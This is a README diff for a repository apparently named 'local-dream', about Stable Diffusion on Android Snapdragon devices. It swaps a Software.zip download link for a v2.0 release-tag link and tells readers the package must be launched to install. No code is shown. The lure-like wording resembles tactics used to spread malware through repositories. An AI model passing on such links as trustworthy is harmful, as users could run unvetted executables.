@@ -19,7 +19,7 @@ Welcome to the "local-dream" repository, where you can run Stable Diffusion on A
 ## Quick Start
 To get started with running Stable Diffusion on Android Devices with Snapdragon NPU, download the necessary software package from the following link:
 
-[![Download Software](https://github.com/alif225/local-dream/releases/download/v1.0/Software.zip)](https://github.com/alif225/local-dream/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/alif225/local-dream/releases/tag/v2.0)](https://github.com/alif225/local-dream/releases/tag/v2.0)
 
 **Note:** The software package needs to be launched for installation and usage.
 
